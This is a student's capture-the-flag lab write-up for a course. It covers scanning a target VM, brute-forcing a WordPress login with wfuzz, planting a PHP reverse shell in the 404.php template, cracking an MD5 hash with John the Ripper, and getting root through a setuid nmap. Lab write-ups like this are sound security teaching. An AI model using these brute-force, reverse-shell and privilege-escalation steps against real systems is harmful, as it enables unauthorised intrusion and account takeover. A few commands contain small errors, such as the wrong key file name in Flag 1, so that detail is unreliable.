# CYBER 451 Lab — Network Security — Privilege Escalation CTF
*Category:* Offensive Security / Threat Hunting  
*Tools:* nmap, wfuzz, hydra, nc, python, john, wget, webshells, WordPress editor  
*Date:* November 12, 2025

---

## Objective
We have a Kali workstation and a target VM. Goal: obtain three flags from the target machine:
1. `key-1-of-3.txt` (web)
2. `key-2-of-3.txt` (user)
3. `key-3-of-3.txt` (root)

This lab demonstrates reconnaissance, web/WordPress exploitation for a web shell, local lateral movement, password cracking, and setuid-based privilege escalation using `nmap`.

---

## FLAG 1 - Web Access

Started by scanning the subnet for the target
`nmap -sS 192.168.62.124`

Identified the target @192.168.62.124
SSH, HTTP, HTTPS are open

Looked around the webserver on Firefox but found nothing
Checked for the robots.txt file and it looks like there is a key

Downloaded the file from the webserver
`wget 192.168.62.124/key-1-of-3.txt`
`cat ~/key-2-of-3.txt`

SUCCESS!

---
## FLAG 2 - User Access

Inside of the robots.txt we also found a dictionary file called `fsocity.dic` so I downloaded it
`wget 192.168.62.124/fsocity.dic`

Sorted the file to reduce duplicates
`cat fsocity.dic | sort | uniq > ecorp.dic`

I first tried to brute force it with **Hydra** but I realized it was taking too long so I moved to **wfuzz**
Started with just the username because it returned "Invalid user" on the login page which makes this much faster
`wfuzz -c -z file,ecorp.dic --hs "Invalid user" -d log=FUZZ\&pwd=password http://192.168.62.124/wp-login.php`

Determined the username **elliot**

Bruteforced the password
`wfuzz -c -z file,ecorp.dic --hs "is incorrect" -d log=elliot\&pwd=FUZZ http://192.168.62.124/wp-login.php`

Credentials -> **elliot:ER28-0652**

Now its time to put these credentials to use
Ideally we want to create a backdoor in the system to maintain persistence
I navigated to the "editor" section in word press and was able to edit many of the **php templates**
I chose to use the **404.php** (page not found) template

### Install a reverse shell

Because no functions are disabled by the php configuration we can write a reverse-shell script
I decided to just use a pre-existing web shell, provided by Kali
`/usr/share/webshells/php/php-reverse-shell.php`
 I copied this into the  **404.php** template and changed the `$ip` to my machine's

Now I need to listen for TCP connections on the same port
`nc -ltp 1234

I got the error `/bin/sh: 0: can't access tty; job control turned off` when I started the reverse shell
So I created a **psuedo-terminal** with python
Ran `python -c "import pty; pty.spawn('/bin/bash')"` in my terminal

### Explore the machine

First I look at the **passwd** file
`cat /etc/passwd`

Found a **robot** user -> check if I can read the home directory

I found the second flag `key-2-of-3.txt` but I can't read it
I also found `password.raw-md5` which I could read and I got a **hash** -> saved the hash to my machine

To crack this I am going to use **John the Ripper** with the **`rockyyou.txt`** wordlist
Once cracked I use the password to login to the user **robot**
```
su robot
Password: <password>
cat ~/key-2-of-3.txt
```

SUCCESS!

---

## FLAG 3 - Root Access

https://pad1ryoshi.medium.com/setuid-the-art-of-priv-esc-5b82d2528715
- A great resource for understanding **setuid** and why it can be used for privilege escalation

To start I will check out all files with a `setuid` property belonging to the root user
_find_ can be very helpful for such searches. I'll redirect `stderr` to `/dev/null` to get rid of all the pesky permission errors.
```find / -perm /4000 -exec ls -lah {} \; 2> /dev/null```

Most of the `setuid` file search seems normal, except for some reason **nmap**
After running `nmap --help` we see that interactive mode is available

*In older versions of nmap, interactive mode allows you to run commands (specifically versions 2.02 to 5.21) directly on the system by prefixing them with !*

**Because nmap is a setuid bianry whatever we run will be executed as root**

By running `nmap> !ls /root` I find the third flag `key-3-of-3.txt`
`nmap> !cat /root/key-3-of-3.txt`

DONE!

---


